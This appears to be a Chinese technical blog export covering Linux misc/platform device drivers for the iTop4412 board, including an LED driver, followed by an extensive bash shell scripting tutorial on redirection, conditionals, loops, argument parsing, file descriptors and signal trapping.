.shutdown = &amp;hello_shutdown, .suspend = &amp;hello_suspend, .resume = &amp;hello_resume, .driver = &#123; .name = DRIVER_NAME, //设备注册- 查看 $itop_kernel/ .owner = THIS_MODULE, &#125;&#125;; 其次定义并且实现 hello_driver; 此类型可查看 驱动 platform_driver 问题: probe_hello: disagrees about version of symbol module_layout 解决办法: ​ uname -r 查看系统内核版本， 同时查看 makefile 提供内核源码版本， 提供与系统内核版本对应一致的版本源码。 注意: 先注册platform_driver结构体， 使用probe 注册杂项设备， 设置两个 name. 或者 在 module_init 中直接使用 misc_register 注册杂项设备, 其效果相同。 如下: probe 示例源码 misc 示例源码 设备节点杂项设备的主设备号是10， 在任何Linux系统中它都是固定的。 杂项设备注册函数 12345678910111213141516include/linux/miscdevice.hstruct miscdevice &#123; int minor; // 设备号， 赋值为 MISC_DYNAMIC_MINOR const char *name; // 设备名称。 const struct file_operations *fops; //file_operations 结构体。 struct list_head list; struct device *parent; struct device *this_device; const char *nodename; mode_t mode;&#125;;extern int misc_register(struct miscdevice * misc);extern int misc_deregister(struct miscdevice *misc); 1extern int misc_register(struct miscdevice *misc); 杂项设备注册函数； 一般在probe中调用，参数为struct miscdevice 。 1extern int misc_deregister(struct miscdevice *misc); 杂项设备卸载函数；一般是在remove函数中用于卸载驱动。 完整代码 1234567891011121314151617static int __init hello_init(void)&#123; int miscstate = 0; //杂项设备； miscstate = misc_register(&amp;hello_device);// 区别: 不进行platform_match 匹配调用，直接注册设备。 printk(KERN_WARNING &quot;misc_register = %d\\n&quot;, miscstate);&#125;static void __exit hello_exit(void)&#123; printk(KERN_WARNING &quot;hello_device exit\\n&quot;); misc_deregister(&amp;hello_device); //删除杂项设备; return 0;&#125;module_init(hello_init);module_exit(hello_exit); ls /dev/ 即可看到我们创建的杂项设备节点： 10 crw------- 1 root root 10, 55 Dec 20 00:00 hello_device_name 即: 我们便可理解：设备节点，驱动名，设备名其实并无任何关系。 Linux file_operations结构体file_operations 结构体的成员函数属于驱动设计的主体内容， 里面的函数和Linux系统给应用程序提供系统接口一一对应。 file_operations 结构体位于 include/linux/fs.h, 定义为: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647/* * NOTE: * all file operations except setlease can be called without * the big kernel lock held in all filesystems. */struct file_operations &#123; struct module *owner; //一般是 THIS_MODULE loff_t (*llseek) (struct file *, loff_t, int); ssize_t (*read) (struct file *, char __user *, size_t, loff_t *); ssize_t (*write) (struct file *, const char __user *, size_t, loff_t *); ssize_t (*aio_read) (struct kiocb *, const struct iovec *, unsigned long, loff_t); ssize_t (*aio_write) (struct kiocb *, const struct iovec *, unsigned long, loff_t); int (*readdir) (struct file *, void *, filldir_t); unsigned int (*poll) (struct file *, struct poll_table_struct *);/* remove by cym 20130408 support for MT660.ko */#if 0//#ifdef CONFIG_SMM6260_MODEM#if 1// liang, Pixtree also need to use ioctl interface... int (*ioctl) (struct inode *, struct file *, unsigned int, unsigned long);#endif#endif/* end remove */ long (*unlocked_ioctl) (struct file *, unsigned int, unsigned long);//与写功能稍微重合,主要针对IO口的控制。 long (*compat_ioctl) (struct file *, unsigned int, unsigned long); int (*mmap) (struct file *, struct vm_area_struct *); int (*open) (struct inode *, struct file *); //对应上层的open函数。打开文件。 int (*flush) (struct file *, fl_owner_t id); int (*release) (struct inode *, struct file *); //对应上层close函数，打开文件操作之后需要关闭。 int (*fsync) (struct file *, int datasync); int (*aio_fsync) (struct kiocb *, int datasync); int (*fasync) (int, struct file *, int); int (*lock) (struct file *, int, struct file_lock *); ssize_t (*sendpage) (struct file *, struct page *, int, size_t, loff_t *, int); unsigned long (*get_unmapped_area)(struct file *, unsigned long, unsigned long, unsigned long, unsigned long); int (*check_flags)(int); int (*flock) (struct file *, int, struct file_lock *); ssize_t (*splice_write)(struct pipe_inode_info *, struct file *, loff_t *, size_t, unsigned int); ssize_t (*splice_read)(struct file *, loff_t *, struct pipe_inode_info *, size_t, unsigned int); int (*setlease)(struct file *, long, struct file_lock **); long (*fallocate)(struct file *file, int mode, loff_t offset, loff_t len);/* add by cym 20130408 support for MT6260 and Pixtree */#if defined(CONFIG_SMM6260_MODEM) || defined(CONFIG_USE_GPIO_AS_I2C) int (*ioctl) (struct inode *, struct file *, unsigned int, unsigned long);#endif/* end add */&#125;; iTop4412_leds.c 源码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183#include &lt;linux/init.h&gt;#include &lt;linux/module.h&gt;#include &lt;linux/kernel.h&gt;#include &lt;linux/fs.h&gt;#include &lt;mach/gpio.h&gt;#include &lt;plat/gpio-cfg.h&gt;#include &lt;linux/miscdevice.h&gt;#include &lt;linux/platform_device.h&gt;//#include &lt;mach/gpio-bank.h&gt;#include &lt;mach/regs-gpio.h&gt;#include &lt;asm/io.h&gt;#include &lt;linux/regulator/consumer.h&gt;//#include \"gps.h\"#include &lt;linux/delay.h&gt;#define LEDS_DEBUG#ifdef LEDS_DEBUG#define DPRINTK(x...) printk(\"LEDS_CTL DEBUG:\" x)#else#define DPRINTK(x...)#endif#define DRIVER_NAME \"leds\"#if defined(CONFIG_CPU_TYPE_SCP_ELITE) || defined(CONFIG_CPU_TYPE_POP_ELITE) || defined(CONFIG_CPU_TYPE_POP2G_ELITE)static int led_gpios[] = &#123; EXYNOS4_GPL2(0), EXYNOS4_GPK1(1),&#125;;#elif defined(CONFIG_CPU_TYPE_SCP_SUPPER) || defined(CONFIG_CPU_TYPE_POP_SUPPER) || defined(CONFIG_CPU_TYPE_POP2G_SUPPER)static int led_gpios[] = &#123;#if defined(CONFIG_MTK_COMBO_COMM) || defined(CONFIG_MTK_COMBO_COMM_MODULE) EXYNOS4_GPC0(2),#else EXYNOS4_GPX2(5),#endif EXYNOS4_GPX0(1),&#125;;#endif#define LED_NUM ARRAY_SIZE(led_gpios) int leds_open(struct inode *inode,struct file *filp)&#123; DPRINTK(\"Device Opened Success!\\n\"); return nonseekable_open(inode,filp);&#125;int leds_release(struct inode *inode,struct file *filp)&#123; DPRINTK(\"Device Closed Success!\\n\"); return 0;&#125;int leds_pm(bool enable)&#123; int ret = 0; printk(\"debug: LEDS PM return %d\\r\\n\" , ret); return ret;&#125;;long leds_ioctl(struct file *file,unsigned int cmd,unsigned long arg)&#123; printk(\"debug: leds_ioctl cmd is %d\\n\" , cmd); switch(cmd) &#123; case 0: case 1: if (arg &gt; LED_NUM) &#123; //LED_NUM = 2 return -EINVAL; &#125; gpio_set_value(led_gpios[arg], cmd); break; default: return -EINVAL; &#125; return 0;&#125;//rokcy 将系统调用 和 驱动程序关联起来的关键数据结构; static struct file_operations leds_ops = &#123; .owner = THIS_MODULE, // 指向拥有这个结构的模块指针; .open = leds_open, //对设备文件进行的第一个操作; .release= leds_release, //文件结构被释放时引用这个操作： .unlocked_ioctl = leds_ioctl,//ioctl 系统调用提供了发出设备特定命令的方法.&#125;;static struct miscdevice leds_dev = &#123; .minor = MISC_DYNAMIC_MINOR, .fops = &amp;leds_ops, .name = \"leds\",&#125;;static int leds_probe(struct platform_device *pdev)&#123; int ret, i; char *banner = \"leds Initialize\\n\"; printk(banner);// for(i=0; i&lt;LED_NUM; i++) &#123; ret = gpio_request(led_gpios[i], \"LED\"); if (ret) &#123; printk(\"%s: request GPIO %d for LED failed, ret = %d\\n\", DRIVER_NAME, led_gpios[i], ret); return ret; &#125; s3c_gpio_cfgpin(led_gpios[i], S3C_GPIO_OUTPUT); gpio_set_value(led_gpios[i], 1); &#125; ret = misc_register(&amp;leds_dev); if(ret&lt;0) &#123; printk(\"leds:register device failed!\\n\"); goto exit; &#125; return 0;exit: misc_deregister(&amp;leds_dev); return ret;&#125;static int leds_remove (struct platform_device *pdev)&#123; misc_deregister(&amp;leds_dev); return 0;&#125;static int leds_suspend (struct platform_device *pdev, pm_message_t state)&#123; DPRINTK(\"leds suspend:power off!\\n\"); return 0;&#125;static int leds_resume (struct platform_device *pdev)&#123; DPRINTK(\"leds resume:power on!\\n\"); return 0;&#125;//rokcy 此结构体 即函数定义; -- 针对不同信号响应信息;static struct platform_driver leds_driver = &#123; //驱动结构体; .probe = leds_probe, //rokcy 驱动调用初始化; .remove = leds_remove, //rocky 移除驱动函数 .suspend = leds_suspend,//rocky 休眠函数; .resume = leds_resume, //休眠后恢复驱动 .driver = &#123; .name = DRIVER_NAME, // 与 注册设备 name 一致; .owner = THIS_MODULE,// 赋值 THIS_MODULE &#125;,&#125;;static void __exit leds_exit(void)&#123; platform_driver_unregister(&amp;leds_driver);&#125;static int __init leds_init(void)&#123; return platform_driver_register(&amp;leds_driver); //[2] 驱动注册;&#125;module_init(leds_init); //rocky 初始化加载;module_exit(leds_exit);MODULE_LICENSE(\"Dual BSD/GPL\"); 导出模块 以及符号的相互作用Linux2.6 内核的/proc/kallsyms 文件对应内核符号表，它记录了符号以及符号所在的内存地址，模块可以使用下列宏导到内核符号表中。 12EXPORT_SYMBOL(符号名) 任意模块均可EXPORT_SYMBOL_GPL(符号名) 只使用包含GPL许可权的模块 示例： 12345678910111213141516171819#include &lt;linux/module.h&gt; /*module_init()*/ #include &lt;linux/kernel.h&gt; /* printk() */ #include &lt;linux/init.h&gt; /* __init __exit */ int add_test(int a ,int b) &#123; return a + b; &#125; int sub_test(int a,int b) &#123; return a - b; &#125; EXPORT_SYMBOL(add_test); EXPORT_SYMBOL(sub_test); MODULE_AUTHOR(&quot;Rocky&quot;); MODULE_LICENSE(&quot;GPL&quot;); 执行cat /proc/kallsyms | grep test 即可找到以下信息，表示模块确实加载到内核表中。 12345678910f88c9008 r __ksymtab_sub_integar [export_symb] f88c9020 r __kstrtab_sub_integar [export_symb] f88c9018 r __kcrctab_sub_integar [export_symb] f88c9010 r __ksymtab_add_integar [export_symb] f88c902c r __kstrtab_add_integar [export_symb] f88c901c r __kcrctab_add_integar [export_symb] f88c9000 T add_tes [export_symb] f88c9004 T sub_tes [export_symb] 13db98c9 a __crc_sub_integar [export_symb] e1626dee a __crc_add_integar [export_symb] 在其它模块中可以引用此符号 123456789101112131415161718192021222324252627282930313233343536#include &lt;linux/module.h&gt; /*module_init()*/ #include &lt;linux/kernel.h&gt; /* printk() */ #include &lt;linux/init.h&gt; /* __init __exit */ #define DEBUG //open debug message #ifdef DEBUG #define PRINTK(fmt, arg...) printk(KERN_WARNING fmt, ##arg) #else #define PRINTK(fmt, arg...) printk(KERN_DEBUG fmt, ##arg) #endif extern int add_test(int a ,int b); extern int sub_test(int a,int b); static int __init hello_init(void) &#123; int a,b; a = add_test(10,20); b = sub_test(30,20); PRINTK(\"the add test result is %d\",a); PRINTK(\"the sub test result is %d\\n\",b); return 0; &#125; static void __exit hello_exit(void) &#123; PRINTK(\" Hello World exit\\n \"); &#125; module_init(hello_init); module_exit(hello_exit); MODULE_AUTHOR(\"Rocky\"); MODULE_LICENSE(\"GPL\"); platform 机制： 总线注册机制 Kernel_init() do_basic_setupo() driver_init() platform_bus_init() bus_register() 注册系统platform总线. 内核启动初始化，自动维护。 添加设备阶段: Platform_device_register() Platform_device_add() pdev-&gt;dev.bus = &amp;platform_bus_type &amp;&amp; device_add() 此步骤操作具体可以查看 $kernel/arch/arm/mach-exynos/mach-itop4412.c 驱动注册阶段: Platform_driver_register() driver_register() bus_add_driver() driver_attach() bus_for_each_dev() 对在每个挂载虚拟的platform bus的设备做 driver_attach（）-&gt; driver_probe_device() 判断drv-&gt;bus-&gt;match() 是否执行成功， 此时通过指针执行platform_match（） 对比name。 知识点: proc 目录是虚拟文件系统， 可以为Linux用户空间和内核空间提供交互， 它存在于内存中， 而不占用实际的flash或者硬盘空间。 /proc/devices/ 里面的设备是加载驱动程序生成的， 即现有驱动创建信息。 /dev/ 下的设备是通过创建设备节点生成的。用户通过此设备节点访问内核驱动。 即系统挂载的实际设备。 /sys/devices/ 里面的设备都是系统初始化， make zImage 编译后注册的新设备。 /proc/misc 查看pc机Ubuntu系统的杂项设备。 /sys/module 查看模块信息， 即lsmod信息 Linux_设备驱动 platform设备驱动","categories":[],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Linux/"},{"name":"Arm","slug":"Arm","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Arm/"},{"name":"Kernel","slug":"Kernel","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Kernel/"}]},{"title":"基础语法","slug":"gram/shell","date":"2017-12-01T09:52:54.000Z","updated":"2018-11-19T16:12:20.515Z","comments":false,"path":"2017/12/01/gram/shell/","link":"","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/2017/12/01/gram/shell/","excerpt":"本章讲解Linux shell基础语法知识与简单命令!","text":"本章讲解Linux shell基础语法知识与简单命令! Shell基础shell父子关系1ps --forest ## 查看shell间的嵌套关系 进程列表在一行中指定依次运行的一系列命令 12345pwd; ls ; cd /etc; pwd; ls ## 将会一次执行变形：(pwd; ls ; cd /etc; pwd; ls) --&gt; 进程列表: 生成子shell来执行相应命令&#123;pwd; ls ; cd /etc; pwd; ls&#125; --&gt; 进程分组: 并不会创建子shell 验证: 12(pwd; ls ; cd /etc; pwd; ls; echo $BASH_SUBSHELL) --&gt; 会输出 1(pwd; ls; (echo $BASH_SUBSHELL)) --&gt; 输出 2 说明shell 层数 SHLVL：shell层数 后台模式 &amp;协程123coproc My_Job &#123; sleep 10; &#125; ## My_Job 扩展自己名字 多个协程通讯 命令才有意义示例: 使用变量全局变量12env printenv 局部变量12Linux 并未提供查看局部变量的命令set 会显示特定进程设置的所有环境变量, 包括局部变量,全局变量以及用户定义变量 设置局部变量后,在此shell进程中可以随意使用,但是在子shell中无法引用 需要将其提升为全局变量, export 命令完成, 提升并不会改变其值, 仅仅改变作用范围 删除变量1unset varname 创建shell脚本1#!/bin/bash ## 指定使用的shell 命令替换 `` $() 从命令输出中提取信息,并将其赋给变量; 反引号(`) $() 符号 命令替换会创建一个子shell来运行对应的命令, 该子shell所执行命令无法使用脚本中所创建的变量 输出重定向 最基本的输出重定向将 命令的输出从显示器发送到指定文件中. 1command &gt; outputfile ## 将命令输出保存在指定文件中 ## 如果文件已经存在, 重定向操作符会用新的数据覆盖已有文件 想要将命令的输出追加到已有文件中 1command &gt;&gt; outputfile 变形: 清空文件 1&gt; outputfile 输入重定向输入重定向将文件的内容重定向到某个命令,而非将命令的输出重定向到文件。 简单输入重定向 1command &gt; inputfile 内联输入重定向 无需使用文件进行重定向, 只需要在命令行中指定用于重定向的数据即可; 123command &lt;&lt; markerdata marker 示例: 12345wc &lt;&lt; EOFtest string 1test string 2test string 3EOF 管道将一个命令的输出作为另一个命令的输入 1command1 | command2 ## 由管道串起来的命令不会一定会依次执行 Linux 系统实际上会同时运行两个命令, 在系统内部将它们链接起来.在第一个命令产生输出的同时, 输出将会立即被送给第二个命令. 数据传输不会用任何中间文件或缓冲区 执行数据运算expr命令1expr 1 + 5 ## 注意空格 操作符 描述 ARG1 \\ ARG2 如果ARG1既不是null 也不是零值, 返回ARG1, 否则返回ARG2 使用方括号 $[ operation ]123456$[ operation ]示例:var=$[ 1 + 5 ]echo $var 浮点运算 bc bc 计算器 123scale ## 设置小数位var=$(echo \"scanle=4; 3.44 / 5\" | bc) 字符串shell-字符串编程 判断和读取字符串 \\${var-default} 和 \\${var=default} ： 如果var没有被声明，则使用\\$default为其值 结构化命令shell脚本中的命令施加一些逻辑流程控制, 根据条件使脚本跳过某些命令, 这样的命令称之为 结构化命令 if-then 语句12345678910 if command then command fior: if command; then commands fi shell 将运行if 后边的command, 如果该命令的退出返回码是0(命令运行成功) then 部分 command 将会被执行 if-then-else123456if commandthen commandelse commandfi 嵌套if-then12345if command; then commandelif command; then commandfi test 命令 (), (( )), [], [[ ]] test 命令提供了在if-then 语句中测试不同条件的途径。 test命令中列出条件成立, test命令就会退出并返回退出状态码0 12345test condition ## condition 是test命令的测试参数 与 值if test condition then; commands;fi [] 测试 第一个方括号之后 和 第二个方括号之前必须加上空格, 否则报错 (( expression )) 提供高级数学表达式 符号 描述 var++, var–, ++var, –var ! 逻辑求反 ~ 位求反 ** 幂运算 &lt;&lt; 左移位 >> 右移位 &amp; 位布尔和 \\ 位布尔或 &amp;&amp; 逻辑和 \\ \\ 逻辑或 ​ [[ expression ]] 提供字符串比较高级特性 可以使用正则表达式来匹配字符串 123456789if [[ $USER == li* ]]then echo \"hello,Postgres\"elif [[ $USER == lig?ng ]]then echo \"hello, Postgres\"else echo \"Sorry, I do not kown you\"fi ​ test 命令可以判断三类条件: 数值比较 只能处理整数 比较 描述 n1 -eq n2 检查n1是否 与 n2 相等 n1 -ge n2 检查n1是否 大于或 等于 n2 相等 n1 -gt n2 检查n1是否 大于 n2 相等 n1 -le n2 检查n1是否 小于 或 等于 n2 相等 n1 -lt n2 检查n1是否 小于 n2 相等 n1 -ne n2 检查n1是否 不等于 n2 相等 ​ 字符串比较 比较 描述 str1 = str2 检查str1 是否和 str2 相同 str1 != str2 检查str1 是否和 str2 不同 str1 &lt; str2 检查str1 是否比 str2 小 str1 &gt; str2 检查str1 是否比 str2 大 -n str 检查str 的长度是否非 0 -z str 检查str 的长度是否为 0 大于号 和 小于号必须转义 ，否则shell会将其当做重定向操作符,将字符串当做文件名 ​ 文件比较 比较 描述 -d file 检查file是否存在并是一个目录 -e file 检查file是否存在 -f file 检查file是否存在并是一个文件 -r file 检查file是否存在并可读 -s file 检查file是否存在并非空 -w file 检查file是否存在并可写 -x file 检查file是否存在并可执行 -O file 检查file是否存在并属当前用户所有 -G file 检查file是否存在并且默认组 与 当前用户相同 file1 -nt file2 检查file1是否比file2新 file1 -ot file2 检查file1是否比file2旧 ​ 复合条件测试 允许使用布尔逻辑来组合测试 case命令123456789101112131415161718192021case variable in pattern1 | pattern2 ) commands;; pattern3) commands;; *) default commands;;esac示例:#!/bin/bash case $USER in Postgres | root) echo \"Welcome , $USER\";; testing) echo \"teting\";; *) echo \"default case\";;esac for 命令重复一组命令直到某个特定条件 123456789101112131415for var in list do commandsdone示例:for var in I don\\`t know do echo word:$vardone结果输出:word:Iword:don`tword:know 通配符读取一系列参数12345678910for var in /etc/*do if [ -d $var ] then echo \"$var is a dir\" elif [ -f $var ] then echo \"$var is a file\" fidone C 风格for循环(( expression )) : 提供高级数学表达式 12345678for (( variable assignment; condition; iteration process ))示例:for (( a = 1; a &lt; 10; a++ ))do echo \"a = $a\"done While 命令1234while test commanddo other commandsdone Until 命令until命令要求你指定一个通常返回非零退出状态的测试命令 只有测试命令的退出状态码不为0, shell 才会执行循环中列出的命令 1234until test commandsdo other commandsdone 控制循环 break break 是退出循环的一个简单办法. 可以用break来退出任意一种循环, 包括for, while, until continue continue 提前终止某次循环 中的命令, 但不会完全终止整个循环; 更改字段分隔符 IFS环境变量IFS , 叫做内部字段分隔符(internal field separator) : 定义了bash shell用作字符分隔符的一系列字符 默认: 空格 制表符 换行符 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455示例1: 采用默认IFS#!/bin/bash file=\"yunsuan.sh\"for var in $(cat $file)do echo \"$var\"done输出结果:#!/bin/bashif[[$USER==lig?ng]]thenecho\"hello,Postgres\"elseecho\"Sorry,Idonotkownyou\"fi示例2： 修改IFS=$'\\t'#!/bin/bash IFS=$'\\t'file=\"yunsuan.sh\"for var in $(cat $file)do echo \"$var\"done输出结果：#!/bin/bashif [[ $USER == lig?ng ]]then echo \"hello, Postgres\"else echo \"Sorry, I do not kown you\"fi 指定多个字符1IFS=$'\\n':;\" ## 将换行符, 冒号, 分号, 双引号作为字符分隔符 用户输入位置参数 \\$0 程序名 \\$1 第一个参数 $$ 程序pid \\$# 脚本运行时 携带命令的参数个数; \\${ $# } 并不能获取最后一个参数 –&gt; not \\${ !# } 用来获取最后一个参数 \\$* \\$@ 访问所有参数 \\$* 将所有参数当做一个单词保存 \\$@ 将所有参数当做同一个字符串中的多个独立单词 1234567for var in \"$@\"do echo $vardoneecho echo 1234for var in \"$*\"do echo $vardone 执行: ./addnum.sh this is work 输出: this is work 去掉双引号, \\$* 与 \\$@ 效果相同 移动变量 shiftshift 命令会根据它们的相对位置来移动命令行参数; 默认情况下, shift 将每个参数变量向左移动一个位置, 变量\\$3的值移动到\\$2, \\$2的值将会移动到\\$1中;而\\$1的值将会被删除掉; 123456789101112131415161718#!/bin/bashwhile [ -n \"$1\" ]do echo \"$1\" shiftdone示例:./shift.sh 1 2 3 4 5 6 输出:123456 123456789101112131415161718192021222324252627282930313233343536373839404142## 处理参数列表#!/bin/bashwhile [ -n \"$1\" ]do case \"$1\" in -a) if [ -n \"$2\" ] then echo \"-a option : \"$2\"\" shift else echo \"Not Fount -a Paramenter\" fi ;; -b) if [ -n \"$2\" ] then echo \"-b option : \"$2\"\" shift else echo \"Not Fount -b Paramenter\" fi ;; --help) echo \"Not Found the --help option\" ;; *) echo \"Usage: default option\" esac shiftdone示例:./shift.sh -a hello -b world --help 输出:-a option : hello-b option : worldNot Found the --help option getopt 命令: 处理命令行getopt命令是一个处理命令行选项和参数时非常方便的工具, 能识别命令行参数, 从而在脚本中解析它们; 1getopt optstring parameters optstring 是关键所在, 它定义了命令行有效的选项字母, 还定义了哪些选项字母需要参数值. 12getopt ab:c -ac -b nihao ifs.sh $(show): -a -c -b nihao -- ifs.sh 冒号(:) 被放在b后边, 因为b选项需要一个参数值 -ac 会自动拆分成两个单独参数,并插入双破折线来分隔行中的额外参数 ifs.sh 加入不存在选项, 将会产生错误值 : -q 可以忽略错误信息 1set -- $(getopt -1 ab:cd &quot;$@&quot;) ## 用getopt命令生成的格式化后的版本来替换已有的命令行选项和参数 123456789101112131415161718192021#!/bin/bashset -- $(getopt -q ab \"$@\")while [ -n \"$1\" ]do case \"$1\" in -a) echo \"-a option \" ;; -b) echo \"-b option \" ;; *) echo \"Usage: default option\" ;; esac shiftdone// 上一个处理命令行不能识别 ./shift -ab getoptsgetopts 是 getops的扩展版; 一次只能处理命令行上检测到的一个参数, 处理完所有参数后, 它会退出并返回一个大于0的退出状态码. 1getopts optstring variable read 用户读取12345678910111213read name ## 直接读取read -p \"Enter you name\" name如果 read 不指定变量， 将存储值 REPLY 环境变量中#!/bin/bash read -p \"Enter your name: \" echo \"hello, $REPLY, welcome to tty\"输出:Enter your name: Postgres hello, Postgres , welcome to tty 超时 read -t1read -t 5 -p \"Enter your name\" name 隐式读取密码1read -s -p &quot;Enter your password: &quot; passwd 读取文件12345678910cat filename | while read linedo echo $linedone ## 方法二while read linedo echo $linedone &lt; filename 标准文件描述符Linux系统将每个对象当做文件处理, Linux用文件描述符来标识每个文件对象, 文件描述符是非负整数 , 每个进程一次最多可以有九个文件描述符. 处于特殊目的, bash shell将保留前三个文件描述符( 0, 1, 2) STDIN STDOUT STDERR 重定输出 &gt; &amp;&gt;12commands 2&gt; test.filecommands 2&gt; test1.file 1&gt; test2.file ##将标准错误输出到test1.file 标准输出到test2.file 也可以将STDERR和STDOUT的输出重定向到同一个输出文件, 为此bash shell提供 &amp;&gt; 重定向操作符 临时重定向 &gt;&amp;重定向到文件描述符时, 必须在文件描述符数组之前加 &amp; 1echo &quot;this is err&quot; &gt;&amp;2 ##关联到 stderr 永久重定向脚本中有大量数据需要重定向,每个都使用echo 很繁琐, 因此可以使用exec 告诉shell脚本执行期间重定向某个特定文件描述符 123exec 1&gt; test.file ## 重新启动新的shell进行stdout文件描述符重定向echo &quot;this is a test of redirecting all output&quot; ## 将输入到test.file 创建自己的重定向 每个进程一次最多可以有九个文件描述符, 除了系统占用 0, 1, 2 还有其他6个均可以作为输入或输出重定向., 可以将这些文件描述符中的任何一个分配给文件.并使用它们. 创建文件描述符使用exec命令创建文件描述符, 并将文件描述符分配给某一文件, 使文件描述符生效. 输出文件描述符 1234exec 3&gt;&gt; filenameexec 3&gt; filenameexec 3&gt;&amp;1 将新分配文件描述符 关联到 标准输出 参考 unistd::dup2(); 1234567891011121314151617重定向示例:#!/bin/bashexec 3&gt;&amp;1 ## stdout 关联到3 即 3 也是标准输出;exec 1&gt;test.file ## 标准输出重定向至 test.file文件echo \"this is test all output\" ## 标准输出将1:文件描述符 重新关联 stdout; 其中文件描述符仅仅做了临时变量作用; exec 1&gt;&amp;3输出到stdout; echo \"hello,world\" 输出结果: $./exec.sh hello,world $ cat test.file this is test all output ​ 读写文件描述符 1234!/bin/bashexec 4&lt;&gt;test.fileread line &lt;&amp;4echo \"read: $line\" 关闭文件描述符 12345678910exec 3&gt;&amp;- ##关闭文件描述符, 需要将其重定向至特殊符号&amp;- $cat badfile.sh:exec 4&gt;testecho \"hello,world\" &gt;&amp;4exec 4&gt;&amp;-echo \"this is bad file desc\" &gt;&amp;4$./badfile.sh ./badfile.sh: 行 10: 4: 错误的文件描述符 列出打开的文件描述符 lsof lsof 命令可以列出整个linux系统打开的所有文件描述符. 但是它会向非系统管理员用户提供Linux系统信息 常用参数: 12345678910111213141516-p 指定进程pid-d 允许指定要显示的文件描述符编号-a 用来对其他两个结果执行布尔AND运算操作.lsof -a -p $$ -d 0,1,2COMMAND PID USER FD TYPE DEVICE SIZE/OFF NODE NAMEzsh 26913 Postgres 0u CHR 136,3 0t0 6 /dev/pts/3zsh 26913 Postgres 1u CHR 136,3 0t0 6 /dev/pts/3zsh 26913 Postgres 2u CHR 136,3 0t0 6 /dev/pts/3 FD: 文件描述符以及访问类型(r代表读， w代表写, u代表读写) TYPE: 文件的类型(CHR 字符类型, BLK 块类型, DIR 目录, REG 常规文件) DEVICE: 设备号(主设备号 和 从设备号) size： 文件大小 NODE: 本地文件的节点号 NAME: 本地文件名 ​ IBM lsof学习 函数创建函数 采用function关键字 123function name&#123; commands;&#125; 定义 123name() &#123; commands;&#125; 返回值 默认退出状态码 函数的默认退出状态码是函数最后一条命令返回的退出状态码 可以用 $? 来确定 return命令 bash shell使用return命令来退出函数并返回特定的退出状态码 若是取值， 函数一结束就取返回值 退出状态码必须在0-255 函数传参在脚本中指定函数时，将参数和函数放置在同一行 1funcname argv1 argv2 函数变量 全局变量 局部变量 使用 local 来声明 local 关键字保证了变量只局限与该函数中, 如果脚本中在该函数之外有同样的名字变量, 那么shell将会保持两个变量的值是分离的 数组变量 和 函数 向函数传递数组 123456789function testit()&#123; local newarray newarray=$(echo \"$@\") echo \"newarray is : $&#123;newarray[*]&#125;\"&#125;old=(1 2 3 4 5)testit $&#123;old[*]&#125; 从函数返回数组 1234567891011121314function array()&#123; local array local i for (( i=0; i&lt;=10; i++ )) &#123; ## or do array[$i]=$[ i * 2 ] &#125; ## or done echo $&#123;array[*]&#125;&#125;输出:$./func.sh0 2 4 6 8 10 12 14 16 18 20 shell 创建库bash shell 允许创建函数文件，然后多个脚本中引用该库文件 123456789$ cat global.sh value=1$cat read.sh#!/bin/bash . ./global.sh ## source ./global.shecho \"global : value = $value\" shtool 构建库退出脚本 shell 中运行的每个命令都使用 退出状态码来告诉shell已经运行完毕. 退出状态码是一个 0 ~ 255 的整数值 1echo $? ## 查看退出状态码 exit 命令 默认情况下, shell 脚本会以脚本中最后一个命令的退出状态码退出; 但可以改变这种默认行为, 返回自己的退出状态码， exit 命令允许自己再脚本结束时指定一个退出状态码 脚本调试 bash 调试 1bash -x shellfile ## 进行脚本调试 脚本调试 123456789set -x ## 开始调试cat $filename | while read linedo echo \"ifs.sh $count: \" $line count=$[ $count + 1 ]doneset +x ## 结束调试 ​ ​ 信号Linux 利用信号与运行在系统上的进程进行通信。 常用信号 信号 值 描述 组合按键 1 SIGHUP 挂起进程 2 SIGINT 终止进程 Ctrl + C 3 SIGQUIT 停止进程 9 SIGKILL 无条件终止进程 kill -9 15 SIGTERM 尽可能终止进程 17 SIGSTOP 无条件停止进程，但不是终止进程 18 SIGTSTP 停止或暂停进程, 但不是终止进程 Ctrl + Z 19 SIGCONT 继续运行停止的进程 捕捉信号 traptrap命令允许指定shell脚本要监看并从shell中拦截的Linux信号 1trap commands signals 示例代码: 12345678910111213141516171819trap \"echo 'Sorry ! I have trapped Ctrl + C' \" SIGINTecho \"this is a test trap commands script\"count=1while [ $count -le 10 ]do echo \"Loop: #$count\" sleep 1 count=$[ $count + 1 ]输出：./trap.sh this is a test trap commands scriptLoop: #1Loop: #2^CSorry ! I have trapped Ctrl + CLoop: #3 捕获退出 1trap &quot;echo godbye...&quot; EXIT 修改或移除信号 在脚本不同的位置进行不同的捕获处理，只需要重新使用带有新选项的trap命令即可. 删除已设置好的捕获, 只需要在trap命令与希望恢复默认行为的信号列表之间叫上两个破折号即可 12trap -- SIGINTecho removed the trap&quot;&quot; 非控制台下运行脚本 nohupnohup 命令运行另一个命令来阻断所有发送给该进程的SIGHUP信号, 这会在退出终端会话时阻止进程退出 1nohup [commands] / [filename] &amp; 谦让度 nice renice在多任务操作系统中, 内核负责将CPU时间分配给系统上运行的每个进程. 调度优先级是内核分配给进程分CPU时间. nice 优先级 -20(最高优先级) —- -19(最低优先级) 默认bash shell以优先级0来启动所有进程 123456 $ ps -p 31504 -o pid,ppid,ni,cmd PID PPID NI CMD31504 30039 0 vi trap.sh## ni 表示优先级nice -n 10 filescript 2&gt;/dev/null &amp; ## -- renice 改变系统上以及运行命令的优先级1renice -n 10 -p pid renice 限制: 只能对属于自己的进程执行renice 只能通过renice降低进程的优先级 